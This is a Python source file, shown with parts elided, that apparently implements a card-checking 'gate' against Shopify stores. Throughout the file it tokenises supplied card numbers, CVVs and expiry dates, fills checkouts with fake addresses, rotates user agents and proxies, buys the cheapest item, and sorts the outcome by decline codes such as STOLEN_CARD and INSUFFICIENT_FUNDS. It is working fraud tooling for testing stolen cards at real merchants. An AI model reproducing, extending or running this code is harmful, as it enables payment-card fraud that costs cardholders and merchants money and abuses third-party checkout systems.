# Pure gate motor for 'shopify' — no Telegram-bot dependency.
...
_UAS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0']

_ADDRESSES_US = [('1600', 'Pennsylvania Ave NW', 'Washington', 'DC', '20500'), ('350', '5th Ave', 'New York', 'NY', '10118'), ('1', 'Infinite Loop', 'Cupertino', 'CA', '95014'), ('221B', 'Baker Street', 'Los Angeles', 'CA', '90001'), ('600', 'Montgomery St', 'San Francisco', 'CA', '94111'), ('401', 'N Michigan Ave', 'Chicago', 'IL', '60611'), ('500', 'S Capitol Ave', 'Indianapolis', 'IN', '46204'), ('600', 'Biscayne Blvd', 'Miami', 'FL', '33132'), ('700', 'Louisiana St', 'Houston', 'TX', '77002'), ('1100', 'Congress Ave', 'Austin', 'TX', '78701'), ('1601', 'Bryant St', 'Denver', 'CO', '80204'), ('1500', 'Market St', 'Philadelphia', 'PA', '19102'), ('100', 'Peachtree St NE', 'Atlanta', 'GA', '30303'), ('500', 'Woodward Ave', 'Detroit', 'MI', '48226'), ('200', 'Boylston St', 'Boston', 'MA', '02116'), ('345', 'Park Ave S', 'New York', 'NY', '10010'), ('800', 'N Glebe Rd', 'Arlington', 'VA', '22203'), ('3500', 'S Las Vegas Blvd', 'Las Vegas', 'NV', '89109'), ('600', 'Congress St', 'Portland', 'ME', '04101'), ('200', 'N Broadway', 'Los Angeles', 'CA', '90012'), ('123', 'Main St', 'Dallas', 'TX', '75201'), ('987', 'Elm St', 'Charlotte', 'NC', '28202'), ('765', 'Central Ave', 'Phoenix', 'AZ', '85004'), ('321', 'Broad St', 'Nashville', 'TN', '37203'), ('444', 'Oak St', 'Columbus', 'OH', '43215'), ('555', 'Pine St', 'Seattle', 'WA', '98101'), ('777', 'Maple Ave', 'Minneapolis', 'MN', '55402'), ('888', 'River St', 'St. Louis', 'MO', '63101'), ('999', 'Cedar Rd', 'Kansas City', 'MO', '64106'), ('111', 'Hickory St', 'New Orleans', 'LA', '70130'), ('222', 'Sycamore Ln', 'Milwaukee', 'WI', '53202'), ('333', 'Sunset Blvd', 'Los Angeles', 'CA', '90046'), ('121', 'Ocean Dr', 'Miami Beach', 'FL', '33139'), ('456', 'Jefferson Ave', 'Louisville', 'KY', '40202'), ('789', 'Capitol St', 'Sacramento', 'CA', '95814'), ('654', 'Union St', 'Portland', 'OR', '97204'), ('321', 'Franklin St', 'Jacksonville', 'FL', '32202'), ('852', 'Lexington Ave', 'Baltimore', 'MD', '21201'), ('963', 'King St', 'Charleston', 'SC', '29401')]

_ADDRESSES_CA = [('100', 'King St W', 'Toronto', 'ON', 'M5V 1E2'), ('200', 'Yonge St', 'Toronto', 'ON', 'M4W 3G2'), ('333', 'Bay St', 'Toronto', 'ON', 'M5J 2R2'), ('700', 'De la Gauchetière St W', 'Montréal', 'QC', 'H3B 2Y3'), ('1200', 'Sainte-Catherine St W', 'Montréal', 'QC', 'H3G 1P6'), ('500', 'Granville St', 'Vancouver', 'BC', 'V6Z 1Y3'), ('1050', 'W Georgia St', 'Vancouver', 'BC', 'V6E 3P3'), ('260', 'Rideau St', 'Ottawa', 'ON', 'K1N 5Y4'), ('400', 'Kent St W', 'Ottawa', 'ON', 'K2P 2R6'), ('119', '17 Ave SW', 'Calgary', 'AB', 'T2T 0E3'), ('800', 'Stephen Ave NW', 'Calgary', 'AB', 'T2P 1C4'), ('101', '104 Ave NW', 'Edmonton', 'AB', 'T5J 4R1'), ('300', '2nd Ave W', 'Edmonton', 'AB', 'T5J 0R2'), ('456', 'Portage Ave', 'Winnipeg', 'MB', 'R3C 3E2'), ('165', 'Market St', 'Halifax', 'NS', 'B3J 3K4'), ('240', 'Waterloo St', 'London', 'ON', 'N6B 1R3'), ('150', 'Johnson St', 'Victoria', 'BC', 'V8W 2K4'), ('360', 'Albert St', 'Saskatoon', 'SK', 'S7K 1A6'), ('210', 'Victoria St', 'Kitchener', 'ON', 'N2G 2L3'), ('95', 'Broadview Ave', 'Toronto', 'ON', 'M4K 2P6')]

_ADDRESSES_UK = [('1', 'Baker Street', 'London', '', 'NW1 6XE'), ('10', 'Downing Street', 'London', '', 'SW1A 2AA'), ('221B', 'Baker Street', 'London', '', 'NW1 6XE'), ('160', 'Tottenham Ct Rd', 'London', '', 'W1T 1JA'), ('55', 'Victoria St', 'London', '', 'SW1H 0TL'), ('1', 'Parliament Square', 'London', '', 'SW1A 0AA'), ('75', 'Oxford St', 'London', '', 'W1D 2DB'), ('110', 'Strand', 'London', '', 'WC2R 0RL'), ('40', 'Fleet St', 'London', '', 'EC4Y 1BJ'), ('30', 'Fenchurch St', 'London', '', 'EC3M 3JF'), ('100', 'Deansgate', 'Manchester', '', 'M3 2LR'), ('5', 'Colmore Circus', 'Birmingham', '', 'B1 2EE'), ('12', 'Princes St', 'Edinburgh', '', 'EH2 2DH'), ('60', 'Queen Charlotte St', 'Bristol', '', 'BS1 4HJ'), ('25', 'Park Row', 'Leeds', '', 'LS1 5PW')]

_ADDRESSES_AU = [('1', 'Macquarie St', 'Sydney', 'NSW', '2000'), ('500', 'George St', 'Sydney', 'NSW', '2000'), ('101', 'Collins St', 'Melbourne', 'VIC', '3000'), ('360', 'Collins St', 'Melbourne', 'VIC', '3000'), ('200', 'Queen St', 'Brisbane', 'QLD', '4000'), ('80', 'King William St', 'Adelaide', 'SA', '5000'), ('140', 'St Georges Tce', 'Perth', 'WA', '6000'), ('30', 'Murray St', 'Hobart', 'TAS', '7000'), ('48', 'Northbourne Ave', 'Canberra', 'ACT', '2601'), ('120', 'Hay St', 'Perth', 'WA', '6000')]

_PRODUCT_BLACKLIST = ['return', 'protection', 'exchange', 'warranty', 'extended warranty', 'insurance', 'plan', 'membership', 'subscription', 'gift card', 'store credit', 'credit', 'add-on', 'addon', 'fee', 'service', 'unlimited return', 'free unlimited']
...
def _random_address(country: str) -> dict:
    ...
    return {'num': num, 'address1': street, 'address': f'{num} {street}', 'city': city, 'state': state, 'zip': zipcode, 'country': country}
...
def _geocode(client: Curl, num: str, street: str, city: str) -> dict:
    ...
    geo_key = re.sub('\\W+', '', key.lower())
    if geo_key in cache:
        return cache[geo_key]
    url = f'https://us1.locationiq.com/v1/search?key={random.choice(_GEO_KEYS)}&q={quote(key)}&format=json'
    try:
...
class CheckoutData:
    ...
    def __init__(self, checkout_html: str):
        m = re.search('<meta name="serialized-graphql" content="([^"]*)"', checkout_html)
        if not m:
    ...
    def meta(html: str, name: str) -> str:
        m = re.search(f'<meta name="{re.escape(name)}" content="([^"]*)"', html)
        if m:
    ...
    def get_stable_ids(self) -> list:
        return [l.get('stableId') for l in self.negotiate_result.get('buyerProposal', {}).get('merchandise', {}).get('merchandiseLines', []) if l.get('stableId')]
    ...
    def build_address(addr: dict) -> dict:
        return {'streetAddress': {'address1': addr['address'], 'city': addr['city'], 'countryCode': addr['countryCode'], 'postalCode': addr['zip'], 'firstName': addr['firstName'], 'lastName': addr['lastName'], 'zoneCode': addr['state'], 'phone': addr['phone']}}

    @staticmethod
    def build_destination(addr: dict) -> dict:
        return {'streetAddress': {'address1': addr['address'], 'city': addr['city'], 'countryCode': addr['countryCode'], 'postalCode': addr['zip'], 'firstName': addr['firstName'], 'lastName': addr['lastName'], 'zoneCode': addr['state'], 'phone': addr['phone'], 'oneTimeUse': False, 'coordinates': {'latitude': addr['lat'], 'longitude': addr['lon']}}}

    @staticmethod
    def build_buyer_identity(currency: str, country_code: str, email: str) -> dict:
        return {'customer': {'presentmentCurrency': currency, 'countryCode': country_code}, 'email': email, 'emailChanged': True, 'phoneCountryCode': country_code, 'marketingConsent': [], 'shopPayOptInPhone': {'countryCode': country_code}, 'rememberMe': False}

    @staticmethod
    def static_fields() -> dict:
        return {'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True}, 'deliveryExpectations': {'deliveryExpectationLines': []}, 'memberships': {'memberships': []}, 'tip': {'tipLines': []}, 'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None, 'scriptFingerprint': {'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []}, 'optionalDuties': {'buyerRefusesDuties': False}, 'cartMetafields': []}
    ...
    def build_proposal_delivery(self, address_data: dict=None) -> dict:
        ...
        if bp_lines:
            ...
            for d_line in bp_lines:
                ...
                line = {'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}}, 'targetMerchandiseLines': {'lines': target_lines}, 'deliveryMethodTypes': ['SHIPPING'] if is_shipping else d_line.get('deliveryMethodTypes', []), 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}
            ...
            if stable_ids:
                is_shipping = self.is_shipping_required()
                line = {'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}}, 'targetMerchandiseLines': {'lines': [{'stableId': s} for s in stable_ids]}, 'deliveryMethodTypes': ['SHIPPING' if is_shipping else 'NONE'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}
                if is_shipping and address_data:
                    line['destination'] = self.build_destination(address_data)
                delivery_lines.append(line)
        return {'deliveryLines': delivery_lines, 'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}

    def build_submit_delivery(self, is_shipping: bool, handle: str, delamount: str, currency: str, stable_id: str, address_data: dict=None) -> dict:
        line = {'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': handle, 'customDeliveryRate': False}, 'options': {}}, 'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]}, 'deliveryMethodTypes': ['SHIPPING' if is_shipping else 'NONE'], 'expectedTotalPrice': {'value': {'amount': delamount, 'currencyCode': currency}}, 'destinationChanged': not is_shipping}
        if is_shipping and address_data:
            line['destination'] = self.build_destination(address_data)
        return {'deliveryLines': [line], 'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}
    ...
    def build_proposal_merchandise(self) -> dict:
        ...
        for line in self.negotiate_result.get('buyerProposal', {}).get('merchandise', {}).get('merchandiseLines', []):
            ...
            lines.append({'stableId': line.get('stableId'), 'merchandise': {'productVariantReference': {'id': merch.get('id', ''), 'variantId': merch.get('variantId', ''), 'properties': merch.get('properties', []), 'sellingPlanId': plan.get('id'), 'sellingPlanDigest': plan.get('sellingPlanGroupId')}}, 'quantity': {'items': {'value': line.get('quantity', {}).get('items', {}).get('value', 1)}}, 'expectedTotalPrice': {'value': {'amount': line.get('totalAmount', {}).get('value', {}).get('amount', '0'), 'currencyCode': self.get_currency()}}, 'lineComponentsSource': None, 'lineComponents': []})
        return {'merchandiseLines': lines}

    def build_proposal_payload(self, session_token: str, queue_token: str, address_data: dict, email: str, proposal_query_id: str) -> dict:
        currency = self.get_currency()
        cc = address_data['countryCode']
        static = self.static_fields()
        payload = {'sessionInput': {'sessionToken': session_token}, 'queueToken': queue_token, 'delivery': self.build_proposal_delivery(address_data), 'merchandise': self.build_proposal_merchandise(), 'payment': {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': self.build_address(address_data)}, 'buyerIdentity': self.build_buyer_identity(currency, cc, email), 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []}, 'shopPayArtifact': {'optIn': {'vaultEmail': '', 'vaultPhone': '', 'optInSource': 'REMEMBER_ME'}}}
        payload.update(static)
        return {'variables': payload, 'operationName': 'Proposal', 'id': proposal_query_id}

    def build_submit_payload(self, session_token: str, queue_token: str, handle: str, delamount: str, tax: str, totalamt: str, currency: str, cctoken: str, payment_method_identifier: str, checkout_token: str, stable_id: str, submit_query_id: str, site: str, cc_first6: str, address_data: dict, email: str) -> dict:
        cc = address_data['countryCode']
        static = self.static_fields()
        is_shipping = self.is_shipping_required()
        payment_line = {'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_identifier, 'sessionId': cctoken, 'billingAddress': self.build_address(address_data), 'cardSource': None}, 'giftCardPaymentMethod': None, 'redeemablePaymentMethod': None, 'walletPaymentMethod': None, 'walletsPlatformPaymentMethod': None, 'localPaymentMethod': None, 'paymentOnDeliveryMethod': None, 'paymentOnDeliveryMethod2': None, 'manualPaymentMethod': None, 'customPaymentMethod': None, 'offsitePaymentMethod': None, 'customOnsitePaymentMethod': None, 'deferredPaymentMethod': None, 'customerCreditCardPaymentMethod': None, 'paypalBillingAgreementPaymentMethod': None, 'remotePaymentInstrument': None}, 'amount': {'value': {'amount': totalamt, 'currencyCode': currency}}}
        input_data = {'sessionInput': {'sessionToken': session_token}, 'queueToken': queue_token, 'delivery': self.build_submit_delivery(is_shipping, handle, delamount, currency, stable_id, address_data), 'merchandise': self.build_proposal_merchandise(), 'payment': {'totalAmount': {'any': True}, 'paymentLines': [payment_line], 'billingAddress': self.build_address(address_data), 'creditCardBin': cc_first6}, 'buyerIdentity': self.build_buyer_identity(currency, cc, email), 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': tax, 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []}, 'shopPayArtifact': {'optIn': {'vaultEmail': '', 'vaultPhone': address_data['phone'], 'optInSource': 'REMEMBER_ME'}}}
        input_data.update(static)
        return {'variables': {'input': input_data, 'attemptToken': f'{checkout_token}-64ptawtxh65', 'metafields': [], 'analytics': {'requestUrl': f'{site}/checkouts/cn/{checkout_token}', 'pageId': stable_id}}, 'operationName': 'SubmitForCompletion', 'id': submit_query_id}

class ShopifyCheckout:

    def __init__(self, site: str, proxy: dict=None, cc: str='', mes: str='', ano: str='', cvv: str='', address: dict=None, email: str=None, product: dict=None):
        self.site = site
        self.proxy = proxy
        ...
        for product in products:
            ...
            for variant in product.get('variants', []):
                ...
                try:
                    ...
                    continue
                if price >= 1.0 and (min_price is None or price < min_price):
                    min_price = price
    ...
    def extract_operation_ids(html: str, client: Curl) -> dict:
        ...
        try:
            ...
            imports = {}
        for path in imports:
            if re.search('/actions\\.', path):
                actions_path = path
                break
        if not actions_path:
            for path in imports:
                if re.search('/actions-legacy\\.', path):
                    actions_path = path
                    break
        if not actions_path:
            m = re.search('(/cdn/shopifycloud/checkout-web/assets/c1/actions(?:-legacy)?\\.[^."]+\\.js)', html)
            if m:
                actions_path = m.group(1)
        if actions_path:
            try:
                js = client.get('https://cdn.shopify.com' + actions_path)
                m = re.search('id:\\s*"([a-f0-9]{64})",\\s*type:\\s*"query",\\s*name:\\s*"Proposal"', js, re.I)
                if m:
                    result['proposal'] = m.group(1)
                m = re.search('id:\\s*"([a-f0-9]{64})",\\s*type:\\s*"mutation",\\s*name:\\s*"SubmitForCompletion"', js, re.I)
                if m:
                    result['submitForCompletion'] = m.group(1)
            except Exception:
                pass
        for path in imports:
            if re.search('/hydrate\\.', path):
                hydrate_path = path
                break
        if not hydrate_path:
            for path in imports:
                if re.search('/hydrate-legacy\\.', path):
                    hydrate_path = path
                    break
        if not hydrate_path:
            m = re.search('(/cdn/shopifycloud/checkout-web/assets/c1/hydrate(?:-legacy)?\\.[^."]+\\.js)', html)
            if m:
                hydrate_path = m.group(1)
        if hydrate_path:
            try:
                js = client.get('https://cdn.shopify.com' + hydrate_path)
                m = re.search('id:\\s*"([a-f0-9]{64})",\\s*type:\\s*"query",\\s*name:\\s*"PollForReceipt"', js, re.I)
                if m:
    ...
    def get_cc_token(self, client: Curl, first_name: str, last_name: str, domain: str) -> str:
        body = json.dumps({'credit_card': {'number': self.cc, 'month': self.mes, 'year': self.ano, 'verification_value': self.cvv, 'start_month': None, 'start_year': None, 'issue_number': '', 'name': f'{first_name} {last_name}'}, 'payment_session_scope': domain})
        tokens = (client.post('https://deposit.shopifycs.com/sessions', body, headers=['Content-Type: application/json']), post_plain('https://deposit.shopifycs.com/sessions', body, headers=['Content-Type: application/json'], proxy=self.proxy))
        token = ''
        for resp in tokens:
            try:
    ...
    def send_proposal(self, client: Curl, extractor: CheckoutData, headers: list, site: str, proposal_payload: dict) -> dict:
        payload = json.dumps(proposal_payload)
        retries = 0
        while True:
            resp = client.post(f'{site}/checkouts/internal/graphql/persisted?operationName=Proposal', payload, headers=headers)
            try:
            ...
            if errors:
                for p_err in errors:
                    code = p_err.get('code', '')
                    if code in ('DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE', 'PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE', 'PAYMENTS_METHOD'):
                ...
                if has_currency_mismatch:
                    ...
                    m = re.search('"presentmentCurrency":"([A-Z]{3})"', resp)
                    if m:
    ...
    def send_submit(self, client: Curl, site: str, headers: list, payload: str, first_name: str, last_name: str, domain: str) -> str:
        cc_retry_done = False
        try:
            ...
            cc_token = ''
        while True:
            resp = client.post(f'{site}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion', payload, headers=headers)
            try:
                data = json.loads(resp)
            except Exception:
                data = {}
            ...
            if not receipt_id:
                ...
                if submit_errors:
                    ...
                    card_errors = ['GENERIC_ERROR', 'INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_CVV', 'INVALID_CVC', 'CARD_DECLINED', 'DO_NOT_HONOR', 'STOLEN_CARD', 'EXPIRED_CARD']
    ...
    @staticmethod
    def poll_receipt(client: Curl, site: str, headers: list, receipt_id: str, session_token: str, poll_query_id: str) -> str:
        variables = json.dumps({'receiptId': receipt_id, 'sessionToken': session_token})
        poll_url = f'{site}/checkouts/internal/graphql/persisted?operationName=PollForReceipt&variables={quote(variables)}&id={poll_query_id}'
        retries = 0
        while True:
            time.sleep(2)
            retries += 1
            ...
            if '"__typename":"ProcessingReceipt"' not in resp and '"__typename":"WaitingReceipt"' not in resp:
                return resp

    def classify_result(self, body: str, data_response: dict, min_price: str) -> str:
        if any((k in body for k in ('/thank_you', '/post_purchase', 'Your order is confirmed', 'Thank you', 'ThankYou', 'thank_you', 'success', 'classicThankYouPageUrl', '"__typename":"ProcessedReceipt"', 'SUCCESS'))):
    ...
    def checkout(self) -> str:
        ...
        while True:
            try:
                ...
                if not re.match('^https?://', site):
                    raise RuntimeError('Invalid site URL.')
                parsed = site.split('://')
                site = f"{parsed[0]}://{parsed[1].split('/')[0]}"
                product = None
                if self.external_product:
                    product = {'id': self.external_product['variant']['id'], 'price': self.external_product['variant']['price'], 'title': self.external_product.get('title', '')}
                else:
                    try:
                ...
                address_data = {'address': address, 'city': city_us, 'state': state_us, 'zip': zip_us, 'countryCode': country_code, 'phone': phone, 'firstName': first_name, 'lastName': last_name, 'lat': lat, 'lon': lon}
                headers = [f'content-type: application/json', f'origin: {site}', f'x-checkout-one-session-token: {session_token}', f'x-checkout-web-build-id: {web_build_id}', 'x-checkout-web-deploy-stage: production', 'x-checkout-web-server-handling: fast', 'x-checkout-web-server-rendering: no', f'x-checkout-web-source-id: {checkout_token}', f'User-Agent: {ua}']
                proposal_payload = extractor.build_proposal_payload(session_token, queue_token, address_data, email, proposal_query_id)
                ...
                submit_payload = extractor.build_submit_payload(session_token, queue_token, handle, delamount, tax, total_amount, currency_code, cc_token, payment_method_identifier, checkout_token, stable_id, submit_query_id, site, self.cc[:6], address_data, email)
                receipt_id = self.send_submit(client, site, headers, json.dumps(submit_payload), first_name, last_name, domain)
...
def _checker(cc, bin_data, site: str, address: dict=None, email: str=None, product: dict=None, proxy: dict=None) -> dict:
    """Run one checkout; returns the API-normalized dict."""
    try:
        num, mes, ano, cvv = (cc[0], cc[1], cc[2], cc[3])
        mes = mes.zfill(2)
        ano = f'20{ano}' if len(ano) <= 2 else ano
        checkout = ShopifyCheckout(site=site, proxy=proxy, cc=num, mes=mes, ano=ano, cvv=cvv, address=address, email=email, product=product)
...
def run_check(cc, bin_data, ctx=None):
    ...
    return _checker(cc, bin_data, site, address=ctx.get('address'), email=ctx.get('email'), product=ctx.get('product'), proxy=proxy)
